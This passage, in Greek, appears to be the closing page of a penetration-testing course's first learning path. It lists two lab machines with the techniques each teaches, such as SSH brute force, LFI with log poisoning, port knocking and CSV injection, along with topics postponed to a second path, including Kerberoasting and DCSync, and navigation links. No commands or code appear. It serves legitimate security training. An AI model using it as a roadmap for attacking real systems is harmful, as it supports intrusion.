| **[`4-070-basic-pentesting-2`](../../labs/4-070-basic-pentesting-2/README.md)** | **SMB χωρίς ανωνυμία**, **brute force SSH με πολιτική**, **`sudo` με συγκεκριμένες εντολές** |
| **[`4-075-dc-9`](../../labs/4-075-dc-9/README.md)** | **LFI + log poisoning σε `/var/log/auth.log`**, **port knocking**, **CSV injection** |

**Και οι κατηγορίες που ΑΝΑΒΛΗΘΗΚΑΝ για τη Μαθησιακή Διαδρομή 2:**

- **Buffer overflow και ανάπτυξη exploit**
- **Deserialization** (PHP, Java, Python)
- **JWT attacks**
- **XSS και CSRF σε βάθος**
- **LDAP injection**
- **IDOR**
- **Active Directory** (Kerberoasting, AS-REP roasting, DCSync)
- **Tunnelling και pivoting**
- **Windows privilege escalation**

**Διαβάστε τα δοκίμια:** [00 — Πριν Ξεκινήσεις](<../00-Πριν-Ξεκινήσεις.md>) έως
[06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>).

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 12 — symfonos: 1](<12-symfonos-1.md>) · **αυτό είναι το τελευταίο μηχάνημα** · πλήρες walkthrough: [`labs/3-040-hackinos-1`](../../labs/3-040-hackinos-1/README.md)_
